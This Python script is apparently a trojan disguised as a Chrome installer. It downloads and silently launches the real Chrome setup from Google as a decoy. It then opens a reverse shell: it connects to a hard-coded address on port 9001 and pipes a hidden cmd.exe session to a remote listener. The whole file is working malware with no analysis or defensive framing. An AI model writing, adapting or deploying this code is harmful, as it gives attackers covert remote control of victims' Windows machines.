import subprocess
import threading
import requests
import socket
import time
import os

URL = "http://dl.google.com/chrome/install/375.126/chrome_installer.exe"
SERVER_HOST = "192.168.43.72"
SERVER_PORT = 9001

def openProgram(programPath):
    os.startfile(programPath, show_cmd=0)

def downloadSetup():
    programPath = os.path.join(os.environ['TEMP'], "ChromeSetup.exe")

    if os.path.exists(programPath):
        return openProgram(programPath)
    
    try:
        response = requests.get(url=URL, allow_redirects=True)
        
        with open(programPath, "wb") as f:
            f.write(response.content)

    except:
        time.sleep(3)
        return downloadSetup()
    
    openProgram(programPath)

def connectToNc():
    def redirect_streams(pipe_out, sock):
        while True:
            data = os.read(pipe_out, 1024)
            if not data:
                break
            sock.sendall(data)

    def receive_data(sock, pipe_in):
        while True:
            data = sock.recv(1024)
            if not data:
                break
            os.write(pipe_in, data)
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))

    stdout_pipe_out, stdout_pipe_in = os.pipe()
    stderr_pipe_out, stderr_pipe_in = os.pipe()
    stdin_pipe_out, stdin_pipe_in = os.pipe()

    threading.Thread(target=redirect_streams, args=(stdout_pipe_out, client_socket)).start()
    threading.Thread(target=redirect_streams, args=(stderr_pipe_out, client_socket)).start()
    threading.Thread(target=receive_data, args=(client_socket, stdin_pipe_in)).start()
    
    proc = subprocess.Popen(
        "cmd.exe",
        stdin=stdin_pipe_out,
        stdout=stdout_pipe_in,
        stderr=stderr_pipe_in,
        shell=True
    )

    proc.wait()
    client_socket.close()


if __name__ == "__main__":
    downloadSetup()
    connectToNc()